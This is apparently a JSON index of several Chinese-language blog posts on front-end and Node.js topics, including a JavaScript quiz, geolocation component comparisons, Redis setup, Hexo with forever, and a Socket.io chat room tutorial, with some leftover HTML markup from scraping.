简单的几道JavaScript Quiz收集了几道不错JavaScript小题，能cover住一部分JavaScript比较重要的基础部分，汇总分享出来学习一下，答案在文章最后。 第一题123(function()&#123; return typeof arguments; &#125;)(); 考察arguments相关知识，参考 第二题12var f = function g()&#123; return 23; &#125;; typeof g(); 考察函数表达式相关知识，参考 第三题1234(function(x)&#123; delete x; return x; &#125;)(1); 考察参数是否可以被删除，参考 第四题12var y = 1, x = y = typeof x; x; 考察typeof相关知识 第五题123(function f(f)&#123; return typeof f(); &#125;)(function()&#123; return 1; &#125;); 考察自执行函数和参数名称冲突的相关问题 第六题12345678var foo = &#123; bar: function() &#123; return this.baz; &#125;, baz: 1 &#125;; (function()&#123; return typeof arguments0; &#125;)(foo.bar); 考察this指向以及参数问题，参考 第七题12345var foo = &#123; bar: function()&#123; return this.baz; &#125;, baz: 1 &#125; typeof (f = foo.bar)(); 还是this指向问题。 第八题12var f = (function f()&#123; return “1”; &#125;, function g()&#123; return 2; &#125;)(); typeof f; 考察逗号和括号表达式问题，参考 第九题12345var x = 1; if (function f()&#123;&#125;) &#123; x += typeof f; &#125; x; 考察if语句判断中不是statement的情况，以及typeof statement的情况。 第十题12345(function f()&#123; function f()&#123; return 1; &#125; return f(); function f()&#123; return 2; &#125; &#125;)(); 考察函数生命解析顺序问题 第十一题12function f()&#123; return f; &#125; new f() instanceof f; 考察new运算符相关知识，参考 第十二题12var x = [typeof x, typeof y][1];typeof typeof x; 考察typeof和[][1]的相关问题。 第十三题123function(foo)&#123; return typeof foo.bar; &#125;)(&#123; foo: &#123; bar: 1 &#125; &#125;); 纯文字游戏，考查传进去的参数的问题。 第十四题with (&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(x, undefined){}) length; 考察with，和函数length问题，其实就是参数的个数，参考 答案汇总1.”object”;2.报错;3.1;4.”undefined”;5.”number”;6.”undefined”;7.”undefined”;8.”number”;9.”1undefined”;10.2;11.false;12.”string”;13.”undefined”;14.2 . 结语如果你这几道小题完全无压力，说明你的JS基础知识已经挺不错了，不过这些小题里面继承的知识貌似没有，Cover的不够全面。 完。。","categories":[{"name":"NLP","slug":"NLP","permalink":"http://chucz.club/categories/NLP/"}],"tags":[{"name":"tag1","slug":"tag1","permalink":"http://chucz.club/tags/tag1/"},{"name":"tag2","slug":"tag2","permalink":"http://chucz.club/tags/tag2/"}]},{"title":"几个前端H5定位组件的对比","slug":"几个前端H5定位组件的对比","date":"2017-03-22T05:18:52.000Z","updated":"2018-09-29T10:11:30.775Z","comments":true,"path":"2017/03/22/几个前端H5定位组件的对比/","link":"","permalink":"http://chucz.club/2017/03/22/几个前端H5定位组件的对比/","excerpt":"This is a summary","text":"This is a summary HTML5 定位HTML5的标准也出来很久了，定位已经不是什么新鲜的技术了。之所以写这个文章，主要是想将你直接调原生H5的方式和腾讯、高德定位组件进行一个对比，对比一下各自的优缺点，给广大使用者一个简单的参考，让你在在项目开发中更容易选择到合适自己的组件。😄 现状如果想使用H5定位有三种可以选择: 原生H5 API Geolocation原生的方式只要在支持的浏览器里面基本上能拿到经纬度，但是如果想拿到地理位置街道信息，就得配合自己公司提供的地理逆解析服务，我团也有这样的服务，其实就是个接口，经纬度传过去，返回对应的地理位置信息，但是总体来说逆解析的接到信息不够精确，偏差会有一些，第一次进来一般都会有一个弹窗，让你选择是否允许使用地理位置信息。 腾讯H5定位组件腾讯的定位可以移步这里，腾讯地图开放平台,里面讲解了如何接入的方式，需要申请一个key和referer，如果key的调用量比较大，需要单独给腾讯地图团队发送邮件申请扩容，通过iframe的放入插入到页面中，更像一个黑盒，不需要了解里面太多的实现方式，也不需要写太多JS就能直接拿到一个返回对象，里面包括了经纬度，地址，城市，行政区id等，而且腾讯的定位和地图组件等针对手Q和微信做了针对性的优化，明显定位速度和精准度要比原生和高德好很多，demo地址可以移步这里，腾讯定位demo，异步引入腾讯定位demo，一定要在手机上看，PC上腾讯定位是不成功的。 高德定位组件高德定位组件的官方接入文档，可以移步这里高德开放平台，至于接入教程，我这里不想过多的讲解，而且网上一搜一大把，或者你按照官方文档做，就很容易实现了，主要想说一下高德的和腾讯的实现方式的区别，腾讯的一次返回经纬度街道信息，高德是先拿到经纬度，然后又在单独拿JS去调用他们的地理逆解析服务，分两步走，但是高德的JS包整体体积较大，开发者写代码较多，高德的选点组件也是如此，总体给人臃肿性能差的特点，但是PC上高德的要比腾讯的优势明显，腾讯的在PC上基本跪了100%拿不到定位信息。 经纬度坐标类型摘自腾讯地图选点组件的官方文档：coordtype有下面这几种,腾讯地图接入默认等于5： GPS坐标2. sogou经纬度3. baidu经纬度4. mapbar经纬度5. [默认]腾讯、google、高德坐标6. sogou墨卡托 这里要提这件事情的原因是，如果你之前接的baidu，sougou地图的话，已经有些地址信息以经纬度存到数据库，从其他地图迁移高德或者腾讯地图的话，他们的坐标会有一个换算关系，所以选择接入的时候要考虑好，建议最好选择第五种腾讯、谷歌、高德这一类的。 对比名称PC端移动端速度地理逆解析允许弹窗体积社交app内嵌优化学习成本key&amp;referer原生定位×√快×经常有小×小无腾讯定位×√快√（一次返回）一天一次较小(20k)√较小需要申请高德定位√√略满√（ 二次调用）偶尔会有较大(80k)√(偶尔会有失败)较大需要申请 总结优缺点也很容易从上面的表格中对比看出来，所以挑适合自己项目情况的使用吧，我们这边最终还是从高德迁移到的腾讯，主要出发点还是从性能角度考虑的，高德的定位包太大，而且开发者自己还得写不少代码，同样的地图选点组件也是，总的来说不如腾讯的省心，但是之前腾讯的有些bug，比如JS动态插入会有问题，每次定位显示弹窗，后我们这边提了一些反馈给他们后，还是修复的很快的，现在这些问题已经解决了。 不过还有一点是值得注意的，页面里多次调用只会返回最后一次的callback，你也可以针对这里自己处理一下，最后需要注意的还是，一定要记得申请Key容量和配额，否则访问量上来之后会使用不了的，提前要做好估量。 后续如果你在使用腾讯地图的各种组件中发现bug，可以联系微博私信反馈给我. 😄 完…","categories":[{"name":"NLP","slug":"NLP","permalink":"http://chucz.club/categories/NLP/"}],"tags":[{"name":"tag1","slug":"tag1","permalink":"http://chucz.club/tags/tag1/"},{"name":"tag2","slug":"tag2","permalink":"http://chucz.club/tags/tag2/"}]},{"title":"搭建Codefilled下的demo服务","slug":"搭建Codefilled下的demo服务","date":"2017-03-22T05:18:52.000Z","updated":"2018-09-29T10:11:30.773Z","comments":true,"path":"2017/03/22/搭建Codefilled下的demo服务/","link":"","permalink":"http://chucz.club/2017/03/22/搭建Codefilled下的demo服务/","excerpt":"This is a summary","text":"This is a summary 引言有时候光写文章贴代码其实是一个挺烦的事情，贴了代码上去，读者不一定愿意看，而且还比较占篇幅，一篇文章可能往下滚半天才能看完，还是需要一个存放Demo的路径比较合适，其实早都想这样弄了，刚好接着捣鼓定位Demo的契机，把demo.codefilled.com搭建起来，这样我的这台服务器上现在有三个Nodejs的服务同时在跑，一个主页的Hexo，一个聊天室m.codefilled.com，还有demo.codefilled.com. 内容现在只放了两个Demo扔在上面，以后随着边写文章，需要配合Demo一起的展示的，都丢到demo.codefilled.com上面去。 HTML5 电池🔋的API的DemoH5🔋电池 API. HTML5 GeoLocation定位的Demo，H5定位，测试接入的是腾讯的定位，参考文档腾讯地图开放平台. HTML5 GeoLocation定位携带Map的Demo，H5带Map展示的定位Demo. 结语HTML5的那个🔋Demo 纯是为了玩，定位这个是腾讯这边对H5 GeoLocation做了优化改进的定位组件，比较适合移动H5开发，针对经常会在微信、手Q里面使用定位功能的场景，做了专门针对腾讯系列社交app内嵌的优化。 完…","categories":[{"name":"NLP","slug":"NLP","permalink":"http://chucz.club/categories/NLP/"}],"tags":[{"name":"tag1","slug":"tag1","permalink":"http://chucz.club/tags/tag1/"},{"name":"tag2","slug":"tag2","permalink":"http://chucz.club/tags/tag2/"}]},{"title":"浅谈WebGL和ThreeJS相关","slug":"浅谈WebGL和ThreeJS相关","date":"2017-03-22T05:18:52.000Z","updated":"2018-09-29T10:11:30.774Z","comments":true,"path":"2017/03/22/浅谈WebGL和ThreeJS相关/","link":"","permalink":"http://chucz.club/2017/03/22/浅谈WebGL和ThreeJS相关/","excerpt":"This is a summary","text":"This is a summary 整理一些WebGL相关 WebGL：是JavaScript的一个API 允许在浏览器端生成3D图像或者图像。 Three.js：是一个WebGL的框架，让在浏览器端生成3D图形更加的容易，它使用 canvas + WebGL 一起共同展示3D场景。 CSS 3D：仅仅只有一些CSS3的一些3D变型，让我们能更容易的实现出3D效果，但是采用的是常规的DOM节点。 D3.js：D3是一个数据可视化的库，它很容易的生成基于数据的图形，但是生成的都是2D的图形。 使用场景 如果你仅仅是在你的网站上想要一些3D的效果用CSS3变形的话，可以看一下这个不错的介绍：Intro to CSS 3D transforms。 如果你是想要做3D模型、纹理、场景，更像真实效果的话，用Three.js。它是在WebGL上面做了很简单又优雅的一层，并且文档完善而丰富，可以从下面这个文档开始学习：Three.js / documentation，或者去这个讲解的教程看看:Getting Start with ThreeJS。 如果想做数据驱动的2D图形，就用D3这个库，这个库有很大能力去构建客户想要的图表，并且能让图片更加有交互性，官网：D3官网。 结语网上也有一些非常cool的demo，是把D3，CSS3D，Three.js这三个库结合在一起的，可以移步这里delimited | CrunchBase Top Investors，讲解的文章D3.js, Three.js and CSS 3D Transforms。希望上面这些会帮助到你，如果你想了解更多的信息请直接去查看他们各自的官方文档，并且也可以去看他们的🌰，会有很多有用的实践，并且让你更容易的去理解他们。 完…","categories":[{"name":"NLP","slug":"NLP","permalink":"http://chucz.club/categories/NLP/"}],"tags":[{"name":"tag1","slug":"tag1","permalink":"http://chucz.club/tags/tag1/"},{"name":"tag2","slug":"tag2","permalink":"http://chucz.club/tags/tag2/"}]},{"title":"Redis在Nodejs中的应用","slug":"Redis在Nodejs中的应用","date":"2017-03-22T05:18:52.000Z","updated":"2018-09-29T10:11:30.776Z","comments":true,"path":"2017/03/22/Redis在Nodejs中的应用/","link":"","permalink":"http://chucz.club/2017/03/22/Redis在Nodejs中的应用/","excerpt":"This is a summary","text":"This is a summary 什么是Redis？Redis是一个开源的拿C语言编写的可持久化的日志型、Key-value的数据库，提供多种语言的API，Nodejs可以以很容易的使用。类似的还有Memcached，Redis和Memcached有一样的地方也有不一样的地方，一样的地方比如：他们都是将数据存到内存中，提高读写速度，避免直接对数据组直接进行读写操作，不一样的地方有很多：Memcached是多线程非阻塞I/O模型，Redis是单线程的I/O复用模型，对于单线程可以将速度优势发挥到最大，实现了epoll，Nodejs的V8核心其实也是epoll，这点上来说两者有着共同的东西，具体Redis和Memcached之间的区别可以移步，Redis与Memcached的区别。因为是纯内存操作，Redis的性能非常出色，每秒可以处理超过10万次读写操作，貌似是性能最快的Key-Value DB. 安装Redis下载安装可以先去中文官网下载压缩包Redis官网，也可以用命令来下载安装，命令如下： 1234567$ wget http://download.redis.io/releases/redis-3.0.6.tar.gz $ tar xzf redis-3.0.5.tar.gz$ mv redis-3.0.5 redis$ cd redis$ make$ make test$ make install 配置Redis.confredis解压目录里有一个配置文件redis.conf ，编辑此配置文件，找到dir ./这一行，Redis会将数据写入文件中，而这里配置的就是将指定数据保存到对应路径，我本机的指定目录是： 1$ dir /Users/&#123;用户名&#125;/redis_data/ 编辑过后，将配置文件移动到 /usr/local/etc 目录下： 1$ sudo mv redis.conf /usr/local/etc 启动Redis命令行输入： 1$ /usr/local/bin/redis-server /usr/local/etc/redis.conf 启动成功画面： 123456789101112131415161718192013417:M 10 Jul 16:52:00.552 Increased maximum number of open files to 10032 (it was originally set to 256). _._ .-__ ‘’-. .- .. ‘’-._ Redis 3.0.6 (00000000/0) 64 bit .-.-`. `\\/ _.,_ &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;-._&lt;/span&gt; &lt;span class=&quot;line&quot;&gt; ( &lt;span class=&quot;string&quot;&gt;&#39; , .-` | `, ) Running in standalone mode&lt;/span&gt; &lt;span class=&quot;line&quot;&gt; |`-._`-...-` __...-.-._|’_.-&lt;span class=&quot;string&quot;&gt;&#39;| Port: 6379&lt;/span&gt; &lt;span class=&quot;line&quot;&gt; |-._ ._ / _.-&#39;&lt;/span&gt; | PID: 13417&lt;/span&gt; &lt;span class=&quot;line&quot;&gt;-._ -._-./ _.-‘ .-‘ |`-.-._-..-‘ .-‘.-‘| | -._-._ .-‘.-‘ | http://redis.io -._-._`-..-‘_.-‘ .-‘ |`-.-._-..-‘ .-‘.-‘| | -._-._ .-‘.-‘ | -._-._`-..-‘_.-‘ .-‘ `-. -.__.-&lt;span class=&quot;string&quot;&gt;&#39; _.-&#39;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;line&quot;&gt;-._ _.-‘ `-.__.-‘13417:M 10 Jul 16:52:00.553 # Server started, Redis version 3.0.613417:M 10 Jul 16:52:00.554 The server is now ready to accept connections on port 6379 如果你有写入操作，控制台就会出现信息，类似于： 12345613417:M 10 Jul 16:52:00.553 # Server started, Redis version 3.0.613417:M 10 Jul 16:52:00.554 The server is now ready to accept connections on port 637913417:M 10 Jul 17:00:33.754 10 changes in 300 seconds. Saving…13417:M 10 Jul 17:00:33.754 Background saving started by pid 1345813458:C 10 Jul 17:00:33.756 DB saved on disk13417:M 10 Jul 17:00:33.856 * Background saving terminated with success Nodejs安装Node_Redis安装1$ npm install redis –save 使用教程Nodejs for Redis 专门有一个官方文档，查询使用方法可以移步到Nodejs版Redis使用文档. Demo12345678910111213141516var redis = require(“redis”), option = &#123;&#125;, client = redis.createClient(option);client.on(“error”, function (err) &#123; console.log(“Error “ + err);&#125;);client.set(“string key”, “string val”, redis.print);client.hset(“hash key”, “hashtest 1”, “some value”, redis.print);client.hset([“hash key”, “hashtest 2”, “some other value”], redis.print);client.hkeys(“hash key”, function (err, replies) &#123; console.log(replies.length + “ replies:”); replies.forEach(function (reply, i) &#123; console.log(“ “ + i + “: “ + reply); &#125;); client.quit();&#125;); 上面是一个简单的demo，大概意思就是新建一个Redis的client，默认的这个Nodejs的client会去连接本地127.0.0.1:6379是否有Redis服务，如果连接成功，则可以往上面配置的指定路径中写入dump.rdb文件，数据文件一般存放在内存中，只要不断开连接，随时可以进行读写，最下面的那个forEach大概意思就是把Redis中Key是”hash key”的字段全部遍历出来。 Nodejs执行之后，控制台会打出这样的结果： 123456Reply: OKReply: 0Reply: 02 replies: 0: hashtest 1 1: hashtest 2 未完待续后续可以关注Codefilled Demo，会在这里完成一个Redis的Demo，大概思路是一个可视化的界面，实现Redis的各种操作。 结语既然Nodejs其实已经算是后端语言了，即便被后端开发多么看不上，但是Nodejs定位已经如此了，还是尽量的能做更多的事情比较好，否则只做个控制器这么薄薄一层就显得像一个玩具了，如果选用了Nodejs作为技术栈还是希望能把离前端最近的那一层给干掉比较合适，否则各大公司天天喊着要前后端分离的意义就不是特别大了。后续会陆续推出一些后端技术相关的文章，消息队列，Nodejs use kafka，RPC(node_thrift),zookeeper等.. 完..","categories":[{"name":"NLP","slug":"NLP","permalink":"http://chucz.club/categories/NLP/"}],"tags":[{"name":"tag1","slug":"tag1","permalink":"http://chucz.club/tags/tag1/"},{"name":"tag2","slug":"tag2","permalink":"http://chucz.club/tags/tag2/"}]},{"title":"如何用Nodejs写一些小工具","slug":"如何用Nodejs写一些小工具","date":"2017-03-22T05:18:52.000Z","updated":"2018-09-29T10:11:30.774Z","comments":true,"path":"2017/03/22/如何用Nodejs写一些小工具/","link":"","permalink":"http://chucz.club/2017/03/22/如何用Nodejs写一些小工具/","excerpt":"This is a summary","text":"This is a summary 引言6月初最近没怎么写文章👿，不是因为偷懒，是因为端午节前去了趟上海迪士尼，回来之后新岗位事情相对较多，在公司内部搭了个MkDoc花了一些业余时间，然后欧洲杯又开幕了😄，看⚽必须是️优先的啊，所以没怎么写。不过话说上海迪士尼虽然没全部建完，不是那么大，但是真心值得一去，从早上8：00开园就进去了，一直到看完🎆才撤退，虽然累成🐶，但是真心好玩呀，大项一定记得要拿pass卡，这样才能保证整个游玩的体验😄，越写越跑题，下面赶紧进入正题😢：网上有各种各样基于Nodejs的工具，不管还是靠谱不靠谱的，总之就是又多又乱，形形色色，五花八门，也有很多雷人的，雷人的就不说了哈😄。工作中其实还是做业务的童鞋比较多，对怎么下手写一个Nodejs的工具包还不是特别有思路，其实当你有了思路之后发现也挺容易的，下面就针对一个简单case，稍微讲一下怎样从一个很简单🌰入手。 正题平常在工作中也有可能遇到这样的情况，比如设计师把设计稿切完给你很多图片（当然很多公司得前端自己切😄），然后图片文名起的不是很满足前端的命名规范，很多图片名字用下划线连接的，例如:”icon_star”，但是我们想把它改成”icon-star”，或者其他的命名方式，但是文件有好几十个，那么这时候手工改几十个文件起来就实在太费劲了，其实这时候用Nodejs写一个package就很容易把这个问题用技术的方法更好的解决掉，而且Nodejs的自带的fs模块对于文件的流操作有十分擅长。 npm如何发布一个package，请移步我之前写的，npm必须掌握的基础概念，这里就不过多讲解了，主要讲一下如何实现上面的那个case。 代码实现在写这个工具前，可以异步Nodejs的官方文档，熟悉一下fs模块，链接:fs模块文档，其实可以看到里面提供了很多的API供我们使用。实现上面的这个case其实就会用到两个主要的API就够了，一个是fs.readdir，另外一个是fs.rename，看这两个名字就大概清楚是做什么的了，一个是读取某个目录，另外一个是给文件改名字。下面是处理这个问题的核心代码： &lt;span class=&quot;variable&quot;&gt;$vim&lt;/span&gt; {project}/index.js var fs = require(&lt;span class=&quot;string&quot;&gt;&apos;fs&apos;&lt;/span&gt;); var src = &lt;span class=&quot;string&quot;&gt;&apos;file&apos;&lt;/span&gt;; /* project/file 下面的需要修改名字的文件目录 */ fs.readdir(src,&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(err,files) { console.log(files); files.forEach(&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(filename) { var oldPath = src + &lt;span class=&quot;string&quot;&gt;&apos;/&apos;&lt;/span&gt; + filename; var newPath = src + &lt;span class=&quot;string&quot;&gt;&apos;/&apos;&lt;/span&gt; + filename.replace(/_/g,&lt;span class=&quot;string&quot;&gt;&quot;-&quot;&lt;/span&gt;); fs.rename(oldPath,newPath,&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(err) { &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(!err) { console.log(filename + &lt;span class=&quot;string&quot;&gt;&quot;替换下划线成功！&quot;&lt;/span&gt;); } }); }); }); &lt;span class=&quot;variable&quot;&gt;$node&lt;/span&gt; index.js `&lt;/pre&gt; 执行node index.js之后，就可以看见结果了。 &lt;pre&gt;`/* 本机执行的结果，上面代码console打出来的&lt;span class=&quot;built_in&quot;&gt;log&lt;/span&gt; */ [ &lt;span class=&quot;string&quot;&gt;&apos;icon_font.js&apos;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&apos;npm_pkg.js&apos;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&apos;oh_mygod.js&apos;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&apos;ops_hi.js&apos;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&apos;web_font.js&apos;&lt;/span&gt; ] icon_font.js替换下划线成功！ oh_mygod.js替换下划线成功！ npm_pkg.js替换下划线成功！ ops_hi.js替换下划线成功！ web_font.js替换下划线成功！ 这时候你再看file目录下面，所有”_”连接的文件名称，全部变为”-“链接。 结语虽然这个🌰比较简单，但是主要是为了提供了一个思路给大家，如何结合自己的工作中的情况来解决重复劳动的问题。其实这个🌰就是利用Nodejs强大的处理文件的能力，提高自己的生产效率，类似这样的问题其实会有不少，怎么去在工作中发掘并解决还是需要经常去思索的. 完…","categories":[{"name":"NLP","slug":"NLP","permalink":"http://chucz.club/categories/NLP/"}],"tags":[{"name":"tag1","slug":"tag1","permalink":"http://chucz.club/tags/tag1/"},{"name":"tag2","slug":"tag2","permalink":"http://chucz.club/tags/tag2/"}]},{"title":"Hexo快速搭建及forever进程守护","slug":"Hexo快速搭建及forever进程守护","date":"2017-03-22T05:18:52.000Z","updated":"2018-09-29T10:11:30.775Z","comments":true,"path":"2017/03/22/Hexo快速搭建及forever进程守护/","link":"","permalink":"http://chucz.club/2017/03/22/Hexo快速搭建及forever进程守护/","excerpt":"This is a summary","text":"This is a summary Hexo简介Hexo是一个采用nodejs的静态博客，市面上的类似的博客也有很多，比较有名的Jekyll，Octopress等，到最早的wordPress，我无聊最后选Hexo纯是因为它用的是nodejs而已。其实Jekyll也很好用啊，用Jekyll+Pages一起就能随便搞一个博客，而且还不用自己买服务器，托管到github上还无需备案，无非就是国内访问github有时候有些慢你懂得，闲的无聊也弄了个tobyreynold，搞起来其实上手比hexo还快，你还可以自己的github账号下面直接建个XXX.github.io的git仓库然后直接一关联就可以了，你也可以买个域名直接指过去，不用他白给你的XXX.github.io也行，随意.. Hexo搭建进入 Hexo官网，按照教程npm install 各种之后，生成Hexo工程，Hexo sever就启动起来了，同样你在服务器端也可以直接这样搞，或者本地搞定了直接rsync到服务器上去也行，又或者直接github上建一个git仓库，本地搞定了推到github，服务器端pull github上的代码就可以了。 Hexo进程守护Node进程守护有很多工具，Forever，PM2，PM2.5 blah blah.解决的问题也是很容易讲清楚，比如：ssh登陆服务器，启动node服务，然后ssh断开连接，服务中断，网站无法访问。这里讲一下用forever 解决 Hexo 进程守护的问题： 安装forever：123$ [sudo] npm install forever -g$ cd /path/to/your/project$ [sudo] npm install forever-monitor Hexo下新建一个app.js,写入下面代码：1234567891011121314var spawn = require(‘child_process’).spawn;free = spawn(‘hexo’, [‘server’, ‘-p 4000’]);/ 其实就是等于执行hexo server -p 4000/free.stdout.on(‘data’, function (data) &#123;console.log(‘standard output:\\n’ + data);&#125;);free.stderr.on(‘data’, function (data) &#123; console.log(‘standard error output:\\n’ + data);&#125;);free.on(‘exit’, function (code, signal) &#123;console.log(‘child process eixt ,exit:’ + code);&#125;); 其实思路也很简单，大致意思就是node启动一个子进程，用forever 守护 hexo sever -p 4000这条命令（4000代表端口），关于node的child_process的相关知识，请自行baidu、google,或者去查nodejs的文档。 执行forever命令：1$ forever –minUptime 10000 –spinSleepTime 26000 start app.js 至于后面这几个minUptime、spinSleepTime可填可不填，不填默认也会有，参数的意思可以直接去forever上查询。 停止服务这里值得注意的是你拿forever启动的服务，通过forever stopall是根本停不掉的，因为其实你执行的是hexo sever，可以通过下面的办法： 123$ lsof -i:[port]$ ps aux|grep hexo$ kill pid(进程的id) 完…","categories":[{"name":"NLP","slug":"NLP","permalink":"http://chucz.club/categories/NLP/"}],"tags":[{"name":"tag1","slug":"tag1","permalink":"http://chucz.club/tags/tag1/"},{"name":"tag2","slug":"tag2","permalink":"http://chucz.club/tags/tag2/"}]},{"title":"深入浅出Nodejs脑图","slug":"深入浅出Nodejs脑图","date":"2017-03-22T05:18:52.000Z","updated":"2018-09-29T10:11:30.774Z","comments":true,"path":"2017/03/22/深入浅出Nodejs脑图/","link":"","permalink":"http://chucz.club/2017/03/22/深入浅出Nodejs脑图/","excerpt":"This is a summary","text":"This is a summary 引言学习Nodejs，这本《深入浅出Nodejs》暂时看起来是市面上深入学习Nodejs中文书里面最好的一本，但是没有Nodejs的基础的拿来直接看，其实还是有些吃力的，有过一些Nodejs的基础的同学看起来还能稍微好一些，如果你能把这本书研究的很透，里面的各种网络编程、内存管理等在边学习理论的过程中能有所实践的话，你的Nodejs水平将会上升到一个新的档次，当然前提是你NPM的基础要扎实，要不在实践过程中遇到一些package管理的问题，解决起来就会很吃力，NPM的基础知识请移步这里，NPM必须掌握的基础概念. 章节最近网上看到一篇文章，一位特别无私的哥们😄，分享了他自己看完深入浅出这本书之后，自己画的脑图，有了几张图之后，学习Nodejs就更方便多了，尤其是啃书比较费劲的同学，可以先对整个学习过程有个大致的思路，再针对知识盲点进行分别突破，对于不是很重要使用不太多的知识可以之后需要的时候再学。下面是我把那几张图引过来，做了一个汇总： Nodejs简介，百度脑图移步 =&gt; 简介. 模块机制，百度脑图移步 =&gt; 模块机制. 异步I/O，百度脑图移步 =&gt; 异步I/O. 内存控制，百度脑图移步 =&gt; 内存控制. 异步编程，百度脑图移步 =&gt; 异步编程. 理解Buffer，百度脑图移步 =&gt; 理解Buffer. 网络编程，百度脑图移步 =&gt; 网络编程. 构建Web应用，百度脑图移步 =&gt; 构建Web应用. 玩转进程，百度脑图移步 =&gt; 玩转进程. 测试相关，百度脑图移步 =&gt; 测试相关. 产品化，百度脑图移步 =&gt; 产品化. 结语有了这些图，对于Nodejs学习还是方便多了，能让你跳出一些技术细节，站在全局来看看Nodejs的技术体系，更进一步的提升Nodejs的技术水平。 完…","categories":[{"name":"NLP","slug":"NLP","permalink":"http://chucz.club/categories/NLP/"}],"tags":[{"name":"tag1","slug":"tag1","permalink":"http://chucz.club/tags/tag1/"},{"name":"tag2","slug":"tag2","permalink":"http://chucz.club/tags/tag2/"}]},{"title":"基于Nodejs的WebSocket聊天室","slug":"基于Nodejs的WebSocket聊天室","date":"2017-03-22T05:18:52.000Z","updated":"2018-09-29T10:11:30.774Z","comments":true,"path":"2017/03/22/基于Nodejs的WebSocket聊天室/","link":"","permalink":"http://chucz.club/2017/03/22/基于Nodejs的WebSocket聊天室/","excerpt":"This is a summary","text":"This is a summary 什么是WebSocket和Socket.io?WebSocket是HTML5的一种通讯协议，实现了浏览器和服务器之间的双向通讯，Socket.io是一个完全用JavaScript实现的，基于Nodejs和WebSocket的协议做的一个开源框架，Socket.IO除了支持WebSocket通讯协议外，还支持许多种轮询（Polling）机制以及其它实时通信方式，并封装成了通用的接口，并且在服务端实现了这些实时机制的相应代码。Socket.IO实现的Polling通信机制包括Adobe Flash Socket、AJAX长轮询、AJAX multipart streaming、持久Iframe、JSONP轮询等。Socket.IO能够根据浏览器对通讯机制的支持情况自动地选择最佳的方式来实现网络实时应用。 准备工作快速生成一个express框架，安装相应package，命令如下: 1234$express ChatRoom / ChatRoom工程的名字，如果没有安装express_cli的需要自行安装 /$cd ChatRoom$vim package.json / package.json dependencies里面添加pm2，ejs，socket.io，或者使用npm install对应package /$npm install –save –registry=http://r.npm.sankuai.com 第一步基本的准备工作完成后，需要把express默认的jade替换成ejs，ejs识别.html的作为模板，.html的也比较方便开发人员来搞。在工程的根目录下: 12345678$vim app.js/ 删掉express默认配置jade的两行代码,注册ejs模板为html页,就是原来以.ejs为后缀的模板页，现在的后缀名可以是.html了 /app.engine(‘.html’, require(‘ejs’).express);/ 设置视图模板的默认后缀名为.html,避免了每次res.Render(“xx.html”)的尴尬 /app.set(‘view engine’, ‘html’);/* 设置模板文件文件夹,dirname为全局变量,表示网站根目录 /app.set(‘views’, __dirname + ‘/views’); $:wq /保存*/ 第二步研究express框架，可以知道package.json里面的scripts的start是”node ./bin/www”，其实就是执行的www这个js，修改成”pm2 start ./bin/www”，这样npm start启动就可以用pm2进行守护进程了。 12345678$pm2 list┌──────────┬────┬──────┬───────┬─────────┬─────────┬────────┬─────────────┬──────────┐│ App name │ id │ mode │ pid │ status │ restart │ uptime │ memory │ watching │├──────────┼────┼──────┼───────┼─────────┼─────────┼────────┼─────────────┼──────────┤│ www │ 2 │ fork │ 81061 │ online │ 47 │ 16m │ 38.145 MB │ disabled ││ www │ 3 │ fork │ 0 │ errored │ 15 │ 0 │ 0 B │ disabled │└──────────┴────┴──────┴───────┴─────────┴─────────┴────────┴─────────────┴──────────┘$pm2 stop all/[id|name] /可以直接停止对应的进程/ 有点跑题了，PM2这里不多讲了，可以直接去PM2的官网自己研究，PM2也提供了一些可编程的API，可以直接写Nodejs来实习PM2的一些指令操作。 第三步修改www这个js文件，代码如下： 12345678910111213$vim bin/www/* Create HTTP server. /var server = http.createServer(app); / 在这句代码下面，加入下面的几行代码/var io = require(‘socket.io’)(server);io.on(‘connection’, function(socket)&#123; socket.on(‘chat message’, function(msg)&#123; io.emit(‘chat message’, msg); &#125;);&#125;);$:wq /保存*/ 第四步进入views这个目录，新建一个index.html，加入下面的代码： 123456789101112131415161718192021222324252627282930313233$vim index.html&lt;!doctype html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;Socket.IO chat&lt;/title&gt; &lt;style&gt; &#123; margin: 0; padding: 0; box-sizing: border-box; &#125;body &#123; font: 13px Helvetica, Arial; &#125;form &#123; background: #000; padding: 3px; position: fixed; bottom: 0; width: 100%; &#125;form input &#123; border: 0; padding: 10px; width: 90%; margin-right: .5%; &#125;form button &#123; width: 9%; background: rgb(130, 224, 255); border: none; padding: 10px; &#125;#messages &#123; list-style-type: none; margin: 0; padding: 0; &#125;#messages li &#123; padding: 5px 10px; &#125;#messages li:nth-child(odd) &#123; background: #eee; &#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;h2&gt; &lt;%=title%&gt; &lt;/h2&gt; &lt;ul id=“messages”&gt;&lt;/ul&gt; &lt;form action=“”&gt; &lt;input id=“m” autocomplete=“off” /&gt;&lt;button&gt;Send&lt;/button&gt; &lt;/form&gt; &lt;script src=“/socket.io/socket.io.js”&gt;&lt;/script&gt; &lt;script src=“http://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;script&gt; var socket = io(); $(‘form’).submit(function()&#123; socket.emit(‘chat message’, $(‘#m’).val()); $(‘#m’).val(‘’); return false; &#125;); socket.on(‘chat message’, function(msg)&#123; $(‘#messages’).append($(‘&lt;li&gt;’).text(msg)); &#125;); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt;$:wq /保存*/ 第五步进入routes目录，编辑index.js，代码如下： 12345678910111213$vim index.jsvar express = require(‘express’);var router = express.Router();/ GET home page. /router.get(‘/‘, function(req, res, next) &#123; res.render(‘index’,&#123;title:‘技术讨论区’&#125;);&#125;);module.exports = router;$:wq /保存/ 保存完毕之后，这时候代码基本就算弄完了，在工程目录里面 npm start 